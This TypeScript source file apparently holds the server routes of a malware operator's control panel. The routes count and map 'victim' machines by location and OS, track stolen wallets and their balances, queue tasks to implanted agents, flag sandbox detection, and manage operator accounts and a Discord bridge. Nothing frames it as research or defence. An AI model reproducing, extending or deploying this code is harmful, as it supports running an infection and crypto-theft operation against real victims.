import type { FastifyPluginAsync } from 'fastify';
import { z } from 'zod';
import { readdir, readFile, stat } from 'node:fs/promises';
import { join } from 'node:path';
import { prisma } from '../lib/db';
import { env } from '../lib/env';
import { bridgeStatus, runBridgeBootstrap, startDiscordBridge, stopDiscordBridge } from '../services/discord-bridge';
import { audit } from '../lib/audit';
import { bad, notFound } from '../lib/errors';
import { requireRole } from '../plugins/auth';
import { hashPassword, passwordPolicy } from '../lib/password';
import { newTotpSecret, totpUri } from '../lib/totp';
import { sealingStatus } from '../services/sealing';

const LOG_DIR = process.env.LOG_DIR ?? './logs';

const logQuery = z.object({
  file: z.string().regex(/^[\w.-]+\.log$/).default('api.log'),
  level: z.enum(['debug', 'info', 'warn', 'error']).optional(),
  q: z.string().max(256).optional(),
  cursor: z.coerce.number().int().min(0).default(0),
  limit: z.coerce.number().int().min(1).max(1000).default(300)
});

const LEVELS: Record<number, string> = { 10: 'debug', 20: 'debug', 30: 'info', 40: 'warn', 50: 'error', 60: 'error' };

/** Never expose cookies, bearer tokens or set-cookie headers in the viewer. */
function redact(line: string): string {
  return line
    .replace(/(set-cookie|cookie)("?\s*:\s*"?)[^"\\\n]+/gi, '$1$2[redacted]')
    .replace(/(authorization"?\s*:\s*"?)(bearer\s+)?[^"\\\n,]+/gi, '$1$2[redacted]')
    .replace(/((?:device_token|build_token|token|password)=)[^&\s,;"]+/gi, '$1[redacted]');
}

function levelOf(line: string): string {
  const numeric = /"level"\s*:\s*(\d+)/.exec(line);
  if (numeric) return LEVELS[Number(numeric[1])] ?? 'info';
  if (/\b(error|fatal)\b|\[error\]/i.test(line)) return 'error';
  if (/\bwarn(ing)?\b|\[warn\]/i.test(line)) return 'warn';
  if (/\bdebug\b|\[debug\]|trace/i.test(line)) return 'debug';
  return 'info';
}

function filterLog(text: string, query: z.infer<typeof logQuery>): Array<{ line: number; level: string; text: string }> {
  const needle = query.q?.toLowerCase();
  const out: Array<{ line: number; level: string; text: string }> = [];
  text.split('\n').forEach((line, index) => {
    if (!line.trim()) return;
    const level = levelOf(line);
    if (query.level && level !== query.level) return;
    if (needle && !line.toLowerCase().includes(needle)) return;
    out.push({ line: index + 1, level, text: redact(line) });
  });
  return out;
}

async function readLog(file: string, cap: number): Promise<string> {
  const info = await stat(join(LOG_DIR, file)).catch(() => null);
  if (!info) throw notFound('log');
  const handle = await readFile(join(LOG_DIR, file));
  return handle.subarray(Math.max(0, handle.length - cap)).toString('utf8');
}

export const miscRoutes: FastifyPluginAsync = async (app) => {
  app.get('/dashboard', async () => {
    const since = new Date(Date.now() - 90_000);
    const recent = { OR: [{ lastHeartbeatAt: { gte: since } }, { lastAgentMessageAt: { gte: since } }] };
    const [total, online, wallets, balances, artifacts, queued, failures, byOs, byCountry] = await Promise.all([
      prisma.victim.count(),
      prisma.victim.count({ where: { ...recent, revokedAt: null } }),
      prisma.wallet.count(),
      prisma.wallet.count({ where: { NOT: { balance: null } } }),
      prisma.artifact.count({ where: { status: 'ready' } }),
      prisma.task.count({ where: { status: { in: ['queued', 'running'] } } }),
      prisma.event.count({ where: { kind: { in: ['task_failed', 'module_degraded', 'artifact_failed', 'outbox_dropped'] }, createdAt: { gte: new Date(Date.now() - 86_400_000) } } }),
      prisma.victim.groupBy({ by: ['os'], _count: { _all: true } }),
      prisma.victim.groupBy({ by: ['country'], _count: { _all: true }, orderBy: { _count: { country: 'desc' } }, take: 8 })
    ]);
    return {
      counters: { total, online, wallets, balances, artifacts, queued, failures },
      byOs: byOs.map((row) => ({ os: row.os, count: row._count._all })),
      byCountry: byCountry.map((row) => ({ country: row.country ?? 'unknown', count: row._count._all }))
    };
  });

  app.get('/map', async () => {
    const rows = await prisma.victim.findMany({
      where: { lat: { not: null }, lon: { not: null } },
      select: { id: true, hostname: true, os: true, country: true, city: true, lat: true, lon: true, lastHeartbeatAt: true, lastAgentMessageAt: true },
      take: 5000
    });
    return { points: rows.map((row) => ({ ...row, online: Date.now() - Math.max(row.lastHeartbeatAt.getTime(), row.lastAgentMessageAt.getTime()) < 90_000 })) };
  });

  app.get('/notifications', async (request) => {
    const unread = (request.query as { unread?: string }).unread === '1';
    const items = await prisma.notification.findMany({ where: unread ? { readAt: null } : {}, orderBy: { createdAt: 'desc' }, take: 100 });
    const count = await prisma.notification.count({ where: { readAt: null } });
    return { items, unread: count };
  });

  app.post('/notifications/read', async (request) => {
    const { ids } = z.object({ ids: z.array(z.string().uuid()).max(500).default([]) }).parse(request.body);
    await prisma.notification.updateMany({ where: ids.length ? { id: { in: ids } } : { readAt: null }, data: { readAt: new Date() } });
    return { ok: true };
  });

  app.get('/events', async (request) => {
    const query = z.object({
      victim: z.string().uuid().optional(),
      kind: z.string().max(64).optional(),
      onlyErrors: z.enum(['0', '1']).optional(),
      cursor: z.string().uuid().optional(),
      limit: z.coerce.number().int().min(1).max(300).default(120)
    }).parse(request.query);
    const baseWhere = {
      ...(query.victim ? { victimId: query.victim } : {}),
      ...(query.onlyErrors === '1' ? {
        OR: [
          { kind: { in: ['task_failed', 'module_degraded', 'artifact_failed', 'outbox_dropped', 'sandbox_suspected', 'enroll_rejected'] } },
          { legacy: { contains: 'error', mode: 'insensitive' as const } }
        ]
      } : {})
    };
    const where = { ...baseWhere, ...(query.kind ? { kind: query.kind } : {}) };
    const [rows, facets] = await Promise.all([
      prisma.event.findMany({
        where,
        orderBy: [{ createdAt: 'desc' }, { id: 'asc' }],
        take: query.limit + 1,
        ...(query.cursor ? { cursor: { id: query.cursor }, skip: 1 } : {}),
        include: { victim: { select: { id: true, hostname: true } } }
      }),
      prisma.event.groupBy({ by: ['kind'], where: baseWhere, _count: { _all: true }, orderBy: { _count: { kind: 'desc' } }, take: 40 })
    ]);
    const page = rows.slice(0, query.limit);
    const groups = new Map<string, {
      key: string;
      kind: string;
      taskId: string | null;
      count: number;
      firstAt: Date;
      lastAt: Date;
      victim: { id: string; hostname: string } | null;
      items: typeof page;
    }>();
    for (const row of page) {
      const data = row.data as { task_id?: string; taskId?: string };
      const taskId = data.task_id ?? data.taskId ?? null;
      const bucket = Math.floor(row.createdAt.getTime() / 120_000);
      const key = `${row.kind}:${taskId ?? '-'}:${bucket}`;
      const group = groups.get(key) ?? {
        key,
        kind: row.kind,
        taskId,
        count: 0,
        firstAt: row.createdAt,
        lastAt: row.createdAt,
        victim: row.victim,
        items: [] as typeof page
      };
      group.count += Number((row.data as { count?: number }).count ?? 1);
      group.firstAt = row.createdAt < group.firstAt ? row.createdAt : group.firstAt;
      group.lastAt = row.createdAt > group.lastAt ? row.createdAt : group.lastAt;
      if (group.items.length < 50) group.items.push(row);
      groups.set(key, group);
    }
    return {
      items: page,
      groups: [...groups.values()],
      counts: Object.fromEntries(facets.map((facet) => [facet.kind, facet._count._all])),
      total: Object.values(Object.fromEntries(facets.map((facet) => [facet.kind, facet._count._all]))).reduce((sum: number, value) => sum + Number(value), 0),
      next: rows.length > query.limit ? page.at(-1)?.id ?? null : null
    };
  });

  app.get('/audit', async (request) => {
    const query = z.object({ q: z.string().max(128).optional(), operator: z.string().uuid().optional(), entity: z.string().max(32).optional(), limit: z.coerce.number().int().max(1000).default(200) }).parse(request.query);
    const items = await prisma.auditLog.findMany({
      where: {
        ...(query.operator ? { operatorId: query.operator } : {}),
        ...(query.entity ? { entity: query.entity } : {}),
        ...(query.q ? { OR: [{ action: { contains: query.q } }, { entityId: { contains: query.q } }] } : {})
      },
      orderBy: { createdAt: 'desc' },
      take: query.limit,
      include: { operator: { select: { email: true } } }
    });
    return { items };
  });

  app.get('/audit/export', async (request, reply) => {
    const format = (request.query as { format?: string }).format === 'json' ? 'json' : 'csv';
    const rows = await prisma.auditLog.findMany({ orderBy: { createdAt: 'desc' }, take: 20000, include: { operator: { select: { email: true } } } });
    await audit(prisma, { operatorId: request.operator?.id, action: 'export.audit', entity: 'audit_log', ip: request.clientIp });
    if (format === 'json') {
      reply.header('content-type', 'application/json');
      reply.header('content-disposition', 'attachment; filename="audit.json"');
      return rows;
    }
    const head = 'at,operator,action,entity,entity_id,ip,data\n';
    const body = rows.map((row) => [row.createdAt.toISOString(), row.operator?.email ?? '', row.action, row.entity, row.entityId ?? '', row.ip ?? '', JSON.stringify(row.data)].map((v) => `"${String(v).replace(/"/g, '""')}"`).join(',')).join('\n');
    reply.header('content-type', 'text/csv');
    reply.header('content-disposition', 'attachment; filename="audit.csv"');
    return head + body;
  });

  app.get('/operators', { preHandler: requireRole('admin') }, async () => {
    const items = await prisma.operator.findMany({ orderBy: { createdAt: 'asc' }, select: { id: true, email: true, role: true, disabled: true, totpEnabled: true, lastLoginAt: true, createdAt: true } });
    return { items };
  });

  app.post('/operators', { preHandler: requireRole('admin') }, async (request, reply) => {
    const input = z.object({ email: z.string().email(), password: z.string(), role: z.enum(['admin', 'operator', 'viewer']) }).parse(request.body);
    const policy = passwordPolicy(input.password);
    if (policy) throw bad('weak_password', policy, 422);
    const secret = newTotpSecret();
    const operator = await prisma.operator.create({
      data: { email: input.email.toLowerCase(), passwordHash: await hashPassword(input.password), role: input.role, totpSecret: secret }
    });
    await audit(prisma, { operatorId: request.operator?.id, action: 'operator.create', entity: 'operator', entityId: operator.id, ip: request.clientIp, data: { role: input.role } });
    return reply.code(201).send({ id: operator.id, email: operator.email, totpSecret: secret, uri: totpUri(operator.email, secret) });
  });

  app.delete('/operators/:id', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    if (id === request.operator!.id) throw bad('self_delete', 'cannot delete the signed-in operator', 409);
    const operator = await prisma.operator.findUnique({ where: { id } });
    if (!operator) throw notFound('operator');
    if (operator.role === 'admin') {
      const admins = await prisma.operator.count({ where: { role: 'admin', disabled: false } });
      if (admins <= 1) throw bad('last_admin', 'create another admin before deleting this one', 409);
    }
    await prisma.operator.delete({ where: { id } });
    await audit(prisma, { operatorId: request.operator?.id, action: 'operator.delete', entity: 'operator', entityId: id, ip: request.clientIp, data: { email: operator.email } });
    return { ok: true };
  });

  app.patch('/operators/:id', { preHandler: requireRole('admin') }, async (request) => {
    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
    const input = z.object({ role: z.enum(['admin', 'operator', 'viewer']).optional(), disabled: z.boolean().optional(), password: z.string().optional() }).parse(request.body);
    if (input.password) {
      const policy = passwordPolicy(input.password);
      if (policy) throw bad('weak_password', policy, 422);
    }
    await prisma.operator.update({
      where: { id },
      data: { role: input.role, disabled: input.disabled, ...(input.password ? { passwordHash: await hashPassword(input.password) } : {}) }
    });
    await audit(prisma, { operatorId: request.operator?.id, action: 'operator.update', entity: 'operator', entityId: id, ip: request.clientIp, data: input });
    return { ok: true };
  });

  app.get('/logs/files', async () => {
    const names = await readdir(LOG_DIR).catch(() => [] as string[]);
    return { items: names.filter((name) => /^[\w.-]+\.log$/.test(name)).sort() };
  });

  app.get('/logs', async (request) => {
    const query = logQuery.parse(request.query);
    const text = await readLog(query.file, 2 * 1024 * 1024);
    const filtered = filterLog(text, query).reverse();
    const end = Math.max(0, filtered.length - query.cursor);
    const start = Math.max(0, end - query.limit);
    return {
      file: query.file,
      size: Buffer.byteLength(text),
      total: filtered.length,
      items: filtered.slice(start, end).reverse(),
      next: start > 0 ? String(query.cursor + (end - start)) : null
    };
  });

  app.get('/logs/download', async (request, reply) => {
    const query = logQuery.parse(request.query);
    const text = await readLog(query.file, 8 * 1024 * 1024);
    reply.header('content-type', 'text/plain; charset=utf-8');
    reply.header('content-disposition', `attachment; filename="${query.file}"`);
    return filterLog(text, query).map((item) => item.text).join('\n') + '\n';
  });

  app.get('/versions', async () => {
    let release = process.env['SPC_RELEASE_VERSION'] ?? '';
    if (!release) {
      for (const candidate of [join(process.cwd(), '..', 'version.txt'), join(process.cwd(), 'version.txt')]) {
        const text = await readFile(candidate, 'utf8').catch(() => '');
        const match = /^(\d+\.\d+\.\d+)$/m.exec(text);
        if (match) {
          release = match[1]!.trim();
          break;
        }
      }
    }
    const rows = await prisma.victim.findMany({ select: { agentVersion: true }, where: { revokedAt: null }, take: 5000 });
    const versions = new Map<string, number>();
    for (const row of rows) versions.set(row.agentVersion || 'unknown', (versions.get(row.agentVersion || 'unknown') ?? 0) + 1);
    const outdated = release
      ? rows.filter((row) => row.agentVersion && row.agentVersion !== release).length
      : 0;
    return {
      release: release || null,
      agents: Array.from(versions, ([version, count]) => ({ version, count })),
      outdated
    };
  });

  app.get('/health', async () => {
    const sealing = await sealingStatus().catch(() => null);
    return {
      ok: true,
      version: 1,
      uptime: Math.floor(process.uptime()),
      degraded: sealing?.degraded ?? false,
      sealing_pending: sealing?.pending ?? null
    };
  });

  app.get('/discord/status', async () => bridgeStatus());

  app.post('/discord/restart', { preHandler: requireRole('admin') }, async () => {
    stopDiscordBridge();
    return { started: await startDiscordBridge() };
  });

  app.get('/discord/ignored', { preHandler: requireRole('admin') }, async () => {
    const items = await prisma.discordIgnore.findMany({ orderBy: { createdAt: 'desc' }, take: 200 });
    return { items };
  });

  app.delete('/discord/ignored/:channelId', { preHandler: requireRole('admin') }, async (request) => {
    const { channelId } = z.object({ channelId: z.string().min(1).max(40) }).parse(request.params);
    const removed = await prisma.discordIgnore.deleteMany({ where: { channelId } });
    if (removed.count === 0) throw notFound('ignored channel');
    await audit(prisma, { operatorId: request.operator?.id, action: 'discord.relink', entity: 'discord_channel', entityId: channelId, ip: request.clientIp });
    void runBridgeBootstrap();
    return { ok: true };
  });

};

export const wsGuard = async (socket: import('ws').WebSocket, request: import('fastify').FastifyRequest): Promise<boolean> => {
  const { verifySession, COOKIE } = await import('../lib/jwt');
  const { allowlisted, clientIp } = await import('../lib/ip');
  const deny = (reason: string): boolean => {
    try {
      socket.close(4401, reason);
    } catch {
      // already closing
    }
    return false;
  };
  const ip = clientIp(request.headers, request.socket.remoteAddress ?? '', env.TRUST_PROXY);
  if (!allowlisted(ip, env.allowlist)) return deny('ip_not_allowlisted');
  const token = request.cookies[COOKIE];
  if (!token) return deny('no_session');
  const claims = await verifySession(token).catch(() => null);
  if (!claims) return deny('bad_session');
  const session = await prisma.session.findUnique({ where: { id: claims.sid } });
  if (!session || session.revokedAt || session.expiresAt < new Date()) return deny('expired_session');
  return true;
};
